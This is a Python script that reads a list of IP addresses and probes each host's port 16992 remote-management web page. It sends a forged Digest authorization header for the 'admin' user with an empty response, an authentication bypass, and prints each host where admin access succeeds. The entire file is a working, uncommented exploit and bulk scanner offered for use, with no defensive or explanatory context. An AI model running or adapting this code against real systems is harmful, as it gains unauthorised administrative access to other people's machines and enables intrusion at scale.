import requests
from bs4 import BeautifulSoup

iplist = []

class networkchecker():
    def __init__(self, ip):
        self.open_port = ['16992']
        self.url = 'http://'+ip+':16992/ip.htm'
        self.ip = ip

    def Authcheeck(self):
        for p in self.open_port:
            print('    Get Http Digest Authentication information')
            try:
                res = requests.get(self.url, timeout=2)
            except Exception as e:
                print(e)
                continue
            
            try:
                result = res.headers['WWW-Authenticate'].split('"')
            except Exception as e:
                print("WWW-Auth is not exist - Maybe not support web UI.")
                print(e)
                continue
            headers = {'Authorization':'Digest username="admin", realm="{}", nonce="{}", uri="index.htm",response="", qop=auth, nc=00000001,cnonce=""'.format(result[1],result[3])}
            try:
                res = requests.get(self.url, headers=headers,timeout=2)
            except Exception as e:
                print(e)
                continue

            body = res.text
            soup = BeautifulSoup(body, 'html.parser')
            if soup.find('input',attrs={'value':'command2'}).has_attr('checked') is True:
                print('    '+self.ip)
def main():
    with open('new.txt','r') as f:
        while True:
            ip = f.readline()
            if not ip:
                break
            ip = ip.strip()
            iplist.append(ip)

    for ip in iplist:
        c = networkchecker(ip)
        c.Authcheeck()

if __name__ =='__main__':
    main()